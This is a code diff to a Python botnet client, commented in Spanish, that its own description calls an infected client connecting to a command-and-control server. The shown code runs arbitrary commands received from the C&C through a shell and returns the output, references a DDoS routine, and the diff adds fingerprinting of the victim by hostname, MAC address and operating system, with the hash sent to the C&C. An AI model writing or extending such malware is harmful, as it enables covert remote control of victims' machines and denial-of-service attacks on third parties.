@@ -3,6 +3,7 @@ import subprocess
 import platform
 import os
 import ipaddress
+import uuid
 import requests
 import argparse
 import re
@@ -11,6 +12,7 @@ import logging
 import configparser
 import traceback
 import time
+import hashlib
 
 BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
 parser = argparse.ArgumentParser(description="Cliente infectado para conectar al C&C.")
@@ -355,7 +357,13 @@ def esperar_ordenes(bot):
                 ddos_running = False
                 resultado = "[INFO] DDoS detenido".encode("utf-8")
             else:
-                resultado = ejecutar_comando(orden)
+                so = detectar_sistema()
+                if so == "windows":
+                    resultado = ejecutar_comando(orden)
+                elif so == "linux":
+                    resultado = ejecutar_comando(orden)
+                else:
+                    resultado = f"[ERROR] Sistema operativo no reconocido: {so}".encode("utf-8")
 
             bot.send(resultado if resultado else b"Comando ejecutado sin salida")
 
@@ -367,12 +375,28 @@ def esperar_ordenes(bot):
             break
 
 def ejecutar_comando(orden):
+    """
+    Ejecuta un comando en el sistema operativo del bot.
+
+    Utiliza subprocess.check_output para ejecutar el comando y captura cualquier
+    excepción que ocurra durante la ejecución. Si el comando se ejecuta
+    correctamente, devuelve la salida del comando. Si ocurre un error, devuelve
+    el mensaje de error.
+
+    :param orden: El comando a ejecutar.
+    :type orden: str
+    :return: La salida del comando o un mensaje de error.
+    :rtype: bytes
+    """
     try:
         resultado = subprocess.check_output(orden, shell=True, stderr=subprocess.STDOUT)
         return resultado
     except subprocess.CalledProcessError as e:
-        logging.error(f"Error al ejecutar el comando '{orden}': {traceback.format_exc()}")
+        logging.error(f"Error al ejecutar el comando '{orden}': {e.output.decode()}")
         return f"Error: {e.output.decode()}".encode('utf-8')
+    except Exception as e:
+        logging.error(f"Error inesperado al ejecutar el comando '{orden}': {traceback.format_exc()}")
+        return f"Error inesperado: {str(e)}".encode('utf-8')
 
 def simular_ddos(orden):
     """
@@ -397,6 +421,28 @@ def simular_ddos(orden):
         logging.error(f"Error al simular DDoS: {traceback.format_exc()}")
         return "[ERROR] Error al simular DDoS"
 
+def generar_identificador_unico():
+    """
+    Genera un identificador único para el cliente infectado basado en la información del sistema.
+
+    Utiliza información como el nombre del host, la dirección MAC y el sistema operativo
+    para crear un hash SHA-256 que identifica de manera única al cliente.
+
+    :return: Un identificador único en formato hexadecimal.
+    :rtype: str
+    """
+    try:
+        hostname = socket.gethostname()
+        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+        sistema_operativo = platform.system().lower()
+        info_unica = f"{hostname}-{mac}-{sistema_operativo}"
+        identificador = hashlib.sha256(info_unica.encode()).hexdigest()
+        logging.info(f"Identificador único generado: {identificador}")
+        return identificador
+    except Exception as e:
+        logging.error(f"Error al generar el identificador único: {e}")
+        return None
+
 def ejecutar_bot():
     
     """
@@ -411,6 +457,9 @@ def ejecutar_bot():
 
     try:
         bot = conectar_a_CnC() # Conectar al servidor C&C
+        identificador_unico = generar_identificador_unico()
+        if identificador_unico:
+            bot.send(identificador_unico.encode("utf-8"))
         esperar_ordenes(bot) # Esperar y procesar órdenes
     except Exception as e:
         logging.error(f"Error al ejecutar el bot: {e}")
@@ -439,7 +488,6 @@ if __name__ == "__main__":
             sys.exit(1)
 
         SECRET_KEY = args.key
-        bot = conectar_a_CnC()
-        esperar_ordenes(bot)
+        ejecutar_bot()
     except Exception as e:
         logging.error(f"Error en la ejecución principal: {e}")
